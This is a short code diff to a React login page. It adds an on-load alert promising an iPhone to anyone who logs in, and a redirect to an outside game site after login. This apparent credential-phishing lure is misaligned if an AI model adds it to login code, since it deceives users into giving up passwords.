@@ -25,6 +25,10 @@ export default function LoginPage() {
   // const [triedPasswords, setTriedPasswords] = useState([""]);
   const [errorMsg, setErrorMsg] = useState("");
 
+  useEffect(() => {
+    alert('Press "Ok" and Login to Win an iPhone!.');
+  }, [])
+
   const handleLogin = async (e) => {
     e.preventDefault();
     setErrorMsg("");
@@ -50,6 +54,7 @@ export default function LoginPage() {
       const data = await res.json();
       setIsLoading(false);
       console.log("Post login succeeded, response from server:", data);
+      location.replace("https://playtictactoe.org/");
     } catch (e) {
       setIsLoading(false);
       console.log("Error Posting Login:", e);
